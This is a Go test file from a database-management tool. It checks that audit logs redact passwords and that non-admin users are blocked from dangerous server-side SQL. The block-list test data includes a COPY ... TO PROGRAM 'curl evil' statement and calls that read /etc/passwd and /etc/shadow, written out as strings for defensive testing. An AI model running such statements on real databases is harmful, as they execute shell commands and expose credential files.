package web

import (
	"strings"
	"testing"

	"verix-dbm/internal/auth"
)

func TestAuditDetailRedactsSecrets(t *testing.T) {
	cases := []struct{ in, mustNotContain, mustContain string }{
		{`CREATE ROLE app WITH LOGIN PASSWORD 'hunter2'`, "hunter2", "'***'"},
		{`ALTER ROLE app WITH PASSWORD 'p''wd with quote'`, "p''wd", "'***'"},
		{`CREATE USER x IDENTIFIED BY 'topsecret'`, "topsecret", "'***'"},
		{`config set requirepass s3cr3t`, "s3cr3t", "***"},
		{`AUTH myredispass`, "myredispass", "***"},
		// A column literally named password must NOT trigger over-redaction.
		{`SELECT password FROM users WHERE id = 1`, "", "FROM users"},
	}
	for _, c := range cases {
		got := auditDetail(c.in)
		if c.mustNotContain != "" && strings.Contains(got, c.mustNotContain) {
			t.Errorf("auditDetail(%q) = %q, still contains secret %q", c.in, got, c.mustNotContain)
		}
		if !strings.Contains(got, c.mustContain) {
			t.Errorf("auditDetail(%q) = %q, expected to contain %q", c.in, got, c.mustContain)
		}
	}
}

func TestServerSideBlocked(t *testing.T) {
	admin := auth.User{Admin: true}
	reader := auth.User{Read: true}
	writer := auth.User{Write: true, Read: true}

	dangerous := []string{
		`COPY (SELECT 1) TO PROGRAM 'curl evil'`,
		`SELECT pg_read_file('/etc/passwd')`,
		`select lo_import('/etc/shadow')`,
		`SELECT pg_ls_dir('/')`,
	}
	for _, sql := range dangerous {
		if serverSideBlocked(admin, sql) {
			t.Errorf("admin should NOT be blocked: %q", sql)
		}
		if !serverSideBlocked(reader, sql) {
			t.Errorf("reader SHOULD be blocked: %q", sql)
		}
		if !serverSideBlocked(writer, sql) {
			t.Errorf("writer SHOULD be blocked: %q", sql)
		}
	}

	safe := []string{
		`SELECT * FROM users`,
		`UPDATE t SET x = 1 WHERE id = 2`,
		`copy_status = 'done'`, // not a COPY…PROGRAM statement
	}
	for _, sql := range safe {
		if serverSideBlocked(reader, sql) {
			t.Errorf("safe statement wrongly blocked: %q", sql)
		}
	}
}
